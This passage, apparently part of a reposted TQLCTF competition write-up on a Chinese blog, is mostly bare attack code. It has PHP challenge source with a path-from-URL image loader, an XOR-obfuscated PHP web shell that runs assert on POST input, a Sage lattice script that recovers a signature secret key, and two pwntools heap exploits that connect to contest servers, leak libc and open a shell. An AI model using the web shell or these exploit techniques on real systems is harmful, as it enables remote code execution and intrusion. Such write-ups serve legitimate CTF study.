else&#123;</span><br><span class="line">  setcookie(&quot;user&quot;, $_POST[&#x27;user&#x27;], time()+3600);</span><br><span class="line">  setcookie(&quot;pass&quot;, $hash_pass, time()+3600);</span><br><span class="line">  Header(&quot;Location:</span><br><span class="line">sandbox/$hash_user.php&quot;);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=&quot;zh&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"> &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line"> &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot;&gt; </span><br><span class="line"> &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line"> &lt;title&gt;Simple Linux&lt;/title&gt;</span><br><span class="line"> &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/styles.css&quot;&gt;</span><br><span class="line"> &lt;!--[if IE]&gt;</span><br><span class="line">  &lt;script src=&quot;http://libs.baidu.com/html5shiv/3.7/html5shiv.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"> &lt;![endif]--&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  </span><br><span class="line">   </span><br><span class="line">    &lt;label for=&quot;tab-1&quot; class=&quot;tab&quot;&gt;Sign In&lt;/label&gt;</span><br><span class="line">    &lt;label for=&quot;tab-2&quot; class=&quot;tab&quot;&gt;Sign Up&lt;/label&gt;</span><br><span class="line">    </span><br><span class="line">     &lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">      </span><br><span class="line">       </span><br><span class="line">        &lt;label for=&quot;user&quot; class=&quot;label&quot;&gt;Username&lt;/label&gt;</span><br><span class="line">        </span><br><span class="line">       </span><br><span class="line">       </span><br><span class="line">        &lt;label for=&quot;pass&quot; class=&quot;label&quot;&gt;Password&lt;/label&gt;</span><br><span class="line">        </span><br><span class="line">       </span><br><span class="line">       &lt;!-- </span><br><span class="line">        </span><br><span class="line">        &lt;label for=&quot;check&quot;&gt; Keep me Signed in&lt;/label&gt;</span><br><span class="line">        --&gt;</span><br><span class="line">       </span><br><span class="line">        </span><br><span class="line">       </span><br><span class="line">       </span><br><span class="line">       &lt;!-- </span><br><span class="line">        [Forgot Password?](#forgot)</span><br><span class="line">        --&gt;</span><br><span class="line">      </span><br><span class="line">     &lt;/form&gt;</span><br><span class="line">     &lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">      </span><br><span class="line">       </span><br><span class="line">        &lt;label for=&quot;user&quot; class=&quot;label&quot;&gt;Username&lt;/label&gt;</span><br><span class="line">        </span><br><span class="line">       </span><br><span class="line">       </span><br><span class="line">        &lt;label for=&quot;pass&quot; class=&quot;label&quot;&gt;Password&lt;/label&gt;</span><br><span class="line">        </span><br><span class="line">       </span><br><span class="line">       </span><br><span class="line">        &lt;label for=&quot;pass&quot; class=&quot;label&quot;&gt;Your Website&lt;/label&gt;</span><br><span class="line">        </span><br><span class="line">       </span><br><span class="line">       </span><br><span class="line">        &lt;label for=&quot;pass&quot; class=&quot;label&quot;&gt;Your Punctuation&lt;/label&gt;</span><br><span class="line">        </span><br><span class="line">       </span><br><span class="line">       </span><br><span class="line">        </span><br><span class="line">       </span><br><span class="line">       </span><br><span class="line">       </span><br><span class="line">        &lt;label for=&quot;tab-1&quot;&gt;Already Member?&lt;/a&gt;</span><br><span class="line">       </span><br><span class="line">      </span><br><span class="line">     &lt;/form&gt;</span><br><span class="line">    </span><br><span class="line">   </span><br><span class="line">  </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line">//  template.html </span><br><span class="line"> &lt;a title=&quot;开始&quot; id=&quot;start_btn&quot;&gt;&lt;/a&gt;</span><br><span class="line">    </span><br><span class="line">      </span><br><span class="line">        &lt;li&gt;</span><br><span class="line">  &lt;?php</span><br><span class="line">   error_reporting(0);</span><br><span class="line">   $user = ((string)__USER__);</span><br><span class="line">   $pass = ((string)__PASS__);</span><br><span class="line">   </span><br><span class="line">   if(isset($_COOKIE[&#x27;user&#x27;]) &amp;&amp; isset($_COOKIE[&#x27;pass&#x27;]) &amp;&amp; $_COOKIE[&#x27;user&#x27;] === $user &amp;&amp; $_COOKIE[&#x27;pass&#x27;] === $pass)&#123;</span><br><span class="line">    echo($_COOKIE[&#x27;user&#x27;]);</span><br><span class="line">   &#125;</span><br><span class="line">   else&#123;</span><br><span class="line">    die(&quot;&lt;script&gt;alert(&#x27;Permission denied!&#x27;);&lt;/script&gt;&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">  ?&gt;</span><br><span class="line">  &lt;/li&gt;</span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">        &lt;li&gt;系统设置&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;使用指南 &lt;/li&gt;</span><br><span class="line">        &lt;li&gt;关于我们&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;退出系统&lt;/li&gt;</span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">[__PUNC__](#)</span><br><span class="line"></span><br><span class="line">  &lt;li class=&quot;desktop_icon&quot; id=&quot;win5&quot; path=&quot;https://image.baidu.com/&quot;&gt; </span><br><span class="line">    图片</span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">  &lt;/li&gt;</span><br><span class="line">  &lt;li class=&quot;desktop_icon&quot; id=&quot;win6&quot; path=&quot;http://www.4399.com/&quot;&gt; </span><br><span class="line">    游戏</span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">  &lt;/li&gt;</span><br><span class="line">  &lt;li class=&quot;desktop_icon&quot; id=&quot;win10&quot; path=&quot;../get_pic.php?image=img/haokangde.png&quot;&gt; </span><br><span class="line">    好康的</span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">  &lt;/li&gt;</span><br><span class="line">  &lt;li class=&quot;desktop_icon&quot; id=&quot;win16&quot; path=&quot;__WEBSITE__&quot;&gt; </span><br><span class="line">    你的网站</span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">  &lt;/li&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  [](#)</span><br><span class="line">  [](#) </span><br><span class="line">  </span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">//  get_pic.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$image = (string)$_GET[&#x27;image&#x27;];</span><br><span class="line">echo &#x27;  &#x27;;</span><br><span class="line">&lt;?php</span><br><span class="line">$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;); // $_=&#x27;assert&#x27;;</span><br><span class="line">$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;); // $__=&#x27;_POST&#x27;;</span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]); // assert($_POST[_]);</span><br><span class="line">from sage.modules.free_module_integer import IntegerLattice</span><br><span class="line"></span><br><span class="line">class grad_desc:</span><br><span class="line"> def __init__(self, delta, n, ss):</span><br><span class="line">  assert ss.ncols() == n</span><br><span class="line">  self.n = n</span><br><span class="line">  self.delta = delta</span><br><span class="line">  self.samples = ss</span><br><span class="line">  self.nsamples = ss.nrows()</span><br><span class="line">  </span><br><span class="line"> def gen_vector(self, n, i):</span><br><span class="line">  vec = [0 for _ in range(n)]</span><br><span class="line">  vec[i] = 0.85</span><br><span class="line">  return vector(RR,vec)</span><br><span class="line">  </span><br><span class="line"> def mom4(self, w): # estimate the kurtosis</span><br><span class="line">  return (1/self.nsamples) * sum([x^4 for x in (self.samples*w)])</span><br><span class="line"></span><br><span class="line"> def grad_mom4(self, w): # estimate the gradient of the kurtosis</span><br><span class="line">  return (4/self.nsamples) * </span><br><span class="line">   sum([dot^(3)*vi for (dot,vi) in zip((self.samples*w), self.samples)])</span><br><span class="line">  </span><br><span class="line"> def run(self, pos): # do the gradient descent</span><br><span class="line">  slow = self.delta * 10^-3</span><br><span class="line">  # 1: pick w0 at random from unit sphere in RR^n</span><br><span class="line">  w_new = self.gen_vector(self.n, pos)</span><br><span class="line">  w_new /= norm(w_new)</span><br><span class="line">  while 1:</span><br><span class="line">   w = w_new</span><br><span class="line">   # 2: grad mom_4(w) from empirical distribution</span><br><span class="line">   g = self.grad_mom4(w)</span><br><span class="line">   # 3. descent</span><br><span class="line">   w_new = w - self.delta * g</span><br><span class="line">   # 4. normalize w_new</span><br><span class="line">   w_new /= norm(w_new)</span><br><span class="line">   # 5. check and return</span><br><span class="line">   m4new = self.mom4(w_new)</span><br><span class="line">   m4 = self.mom4(w)</span><br><span class="line">   if m4 - m4new &lt; slow:</span><br><span class="line">    return w</span><br><span class="line"></span><br><span class="line">def babai(lattice, gram, target):</span><br><span class="line"> t = target</span><br><span class="line"> for i in reversed(range(lattice.nrows())):</span><br><span class="line">  c = ((t * gram[i]) / (gram[i] * gram[i])).round()</span><br><span class="line">  t -= lattice[i] * c</span><br><span class="line"> return target - t</span><br><span class="line"></span><br><span class="line">pk = load(&quot;pk&quot;)</span><br><span class="line">sigs = load(&quot;signatures&quot;)</span><br><span class="line">print(&quot;Load Finish&quot;)</span><br><span class="line"></span><br><span class="line">pklll = IntegerLattice(pk, lll_reduce=True).reduced_basis</span><br><span class="line">pkgram = pklll.gram_schmidt()[0]</span><br><span class="line">print(&quot;LLL Finish&quot;)</span><br><span class="line"></span><br><span class="line">n_samples = 0</span><br><span class="line">samples = []</span><br><span class="line">for sig in sigs:</span><br><span class="line"> samples.append(2*sig[1])</span><br><span class="line"> n_samples+=1</span><br><span class="line">samples = matrix(samples)</span><br><span class="line"></span><br><span class="line">G = (3/n_samples) * (samples.transpose() * samples)</span><br><span class="line">print(&quot;G calculated&quot;)</span><br><span class="line">save(G, &#x27;G&#x27;)</span><br><span class="line">L = G.inverse().cholesky().n() # in AA. need to convert to finite precision ( .n() ) or later it&#x27;ll take forever...</span><br><span class="line">print(&quot;L calculated&quot;)</span><br><span class="line">save(L, &#x27;L&#x27;)</span><br><span class="line">samples_hypercube = samples * L</span><br><span class="line">print(&quot;samples_hypercube calculated&quot;)</span><br><span class="line">save(samples_hypercube, &#x27;samples_hypercube&#x27;)</span><br><span class="line"></span><br><span class="line">basis = []</span><br><span class="line">gd = grad_desc(0.7, 128, samples_hypercube)</span><br><span class="line"></span><br><span class="line">for i in range(128):</span><br><span class="line"> w = gd.run(i)</span><br><span class="line"> print(i, &quot;GradDesc&quot;, w)</span><br><span class="line"> v = vector(map(round, w*L.inverse()))</span><br><span class="line"> print(i, &quot;Found vector&quot;, v)</span><br><span class="line"> sol = babai(pklll, pkgram, v)</span><br><span class="line"> print(i, &quot;Basis vector&quot;, sol)</span><br><span class="line"> basis += [sol]</span><br><span class="line"></span><br><span class="line">sk = matrix(ZZ, basis)</span><br><span class="line">save(sk, &#x27;sk&#x27;)</span><br><span class="line"># _*_ coding:</span><br><span class="line">utf-8 _*_</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">prog = &#x27;/home/ctf/pwn&#x27;</span><br><span class="line">p = remote(&quot;119.23.255.127&quot;, 25799)#nc 124.71.130.185 49155</span><br><span class="line"># p = remote(&quot;127.0.0.1&quot;, 9999)#nc 124.71.130.185 49155</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def choice(idx):</span><br><span class="line">    p.sendlineafter(&quot;&gt; &quot;,str(idx))</span><br><span class="line"></span><br><span class="line">def add(sz,con):</span><br><span class="line">    choice(1)</span><br><span class="line">    sleep(0.1)</span><br><span class="line">    p.sendline(str(sz))</span><br><span class="line">    sleep(0.1)</span><br><span class="line">    p.sendline(con)</span><br><span class="line">    # sa(&quot;content?&quot;,cno)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    choice(2)</span><br><span class="line">    sleep(0.1)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    add(0x90,p64(0)*3+p64(0x400))</span><br><span class="line"></span><br><span class="line">    add(0x280,&#x27;init-0&#x27;)</span><br><span class="line">    </span><br><span class="line">    for i in range(16):</span><br><span class="line">        add(i*0x10+0xa0,(p64(0)+p64(0)+p64(0)+p64(0x21)+(p64(0)+p64(0x61))*((i*0x10+0x70)/0x10)))</span><br><span class="line">    delete(-0x290)</span><br><span class="line">    fake_t = p16(7)*8*3</span><br><span class="line">    choice(2)</span><br><span class="line">    add(0x280,fake_t)</span><br><span class="line"></span><br><span class="line">    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*8+p8(0xe0)</span><br><span class="line">    add(0x280,fake_t)</span><br><span class="line">    # add(0x50,&#x27;a&#x27;)</span><br><span class="line">    add(0x90,&#x27;a&#x27;)</span><br><span class="line">    </span><br><span class="line">    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*10+p8(0xc0)</span><br><span class="line">    add(0x280,fake_t)   </span><br><span class="line">    add(0xb0,&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*11+p8(0x80)</span><br><span class="line">    add(0x280,fake_t)   </span><br><span class="line">    add(0xc0,&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*12+p8(0x50)</span><br><span class="line">    add(0x280,fake_t)   </span><br><span class="line">    add(0xd0,&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*13+p8(0x30)</span><br><span class="line">    add(0x280,fake_t)   </span><br><span class="line">    add(0xe0,&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*14+p8(0x20)</span><br><span class="line">    add(0x280,fake_t)   </span><br><span class="line">    add(0xf0,&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*15+p8(0x20)</span><br><span class="line">    add(0x280,fake_t)   </span><br><span class="line">    add(0x100,&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*16+p8(0x30)</span><br><span class="line">    add(0x280,fake_t)   </span><br><span class="line">    add(0x110,&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*40</span><br><span class="line">    add(0x280,fake_t)   </span><br><span class="line"></span><br><span class="line">    pay = 0x3d0*&#x27;a&#x27;+p64(0)+p64(0x21)+p64(0x404070)</span><br><span class="line"></span><br><span class="line">    add(0x3f0,pay)</span><br><span class="line"></span><br><span class="line">    add(0x10,&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line"># _*_ coding:</span><br><span class="line">utf-8 _*_</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">prog = &#x27;./nemu&#x27;</span><br><span class="line">p = remote(&quot;47.107.29.210&quot;, 36088)#nc 124.71.130.185 49155</span><br><span class="line"># p = remote(&quot;127.0.0.1&quot;, 9999)#nc 124.71.130.185 49155</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def choice(idx):</span><br><span class="line">    p.sendlineafter(&quot;&gt; &quot;,str(idx))</span><br><span class="line"></span><br><span class="line">def add(sz,con):</span><br><span class="line">    choice(1)</span><br><span class="line">    sleep(0.1)</span><br><span class="line">    p.sendline(str(sz))</span><br><span class="line">    sleep(0.1)</span><br><span class="line">    p.sendline(con)</span><br><span class="line">    # sa(&quot;content?&quot;,cno)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    choice(2)</span><br><span class="line">    sleep(0.1)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    pool = 0x6a3b80</span><br><span class="line">    p.sendlineafter(&quot;(nemu) &quot;,&#x27;x 5 &#x27;+str(8000030))</span><br><span class="line">    p.recvuntil(&quot;0x08000040t0x&quot;)</span><br><span class="line">    heap = int(p.recv(8),16)</span><br><span class="line">    print(&quot;[++++++++++]&quot;,heap)</span><br><span class="line">    #                                       #</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(&quot;(nemu) &quot;,&#x27;x 10 &#x27;+hex(0x3d8+heap-pool)[2:])</span><br><span class="line">    p.recvuntil(&quot;t0x&quot;)</span><br><span class="line">    l1 = int(p.recv(8),16)</span><br><span class="line">    p.recvuntil(&quot;t0x&quot;)</span><br><span class="line">    l2 = int(p.recv(8),16)</span><br><span class="line">    libcof = l1+l2*0x100000000</span><br><span class="line">    #                                       #</span><br><span class="line">    addr = libcof - 0x3c4ce8</span><br><span class="line">    print(&quot;[++++++++++]&quot;,addr)</span><br><span class="line">    og = addr + 0x4527a</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(&quot;(nemu) &quot;,&#x27;set &#x27;+ str(0x86A3FC0-pool) + &#x27; &#x27; + &#x27;0x60f078&#x27;)</span><br><span class="line">    p.sendlineafter(&quot;(nemu) &quot;,&#x27;set &#x27;+ str(0x86A3FC0-pool+4) + &#x27; &#x27; + str((0x60f078)&gt;&gt;32))</span><br><span class="line">    p.sendlineafter(&quot;(nemu) &quot;,&#x27;w 0x&#x27;+hex(og)[6:])</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
+
+
+---
+## 附图
+
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+
+---
+
+> **转载声明**：本文转载自 [Des-CTF-Knowledge](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge)（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。
+> 原文链接：[https://www.ctfiot.com/27072.html](https://www.ctfiot.com/27072.html)
+> 仓库原文：[CTF大赛WP集合/articles/TQLCTF-WriteUp.full.md](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/TQLCTF-WriteUp.full.md)
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/php-lfi/">php-lfi</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/01/01/ctf-kb/wp/Web/SECCON_CTF_2022_Quals_writeup_-_English/" title="SECCON CTF 2022 Quals writeup - English"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SECCON CTF 2022 Quals writeup - English</div></div></a></div><div class="next-post pull-right"><a href="/2022/01/01/ctf-kb/wp/Web/WEB-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-2022%E4%B8%AD%E5%9B%BD%E6%9D%AD%E5%B7%9E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9B%E5%AE%98%E6%96%B9Write_Up/" title="WEB｜西湖论剑 2022 中国杭州网络安全技能大赛初赛官方 Write Up"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">WEB｜西湖论剑 2022 中国杭州网络安全技能大赛初赛官方 Write Up</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
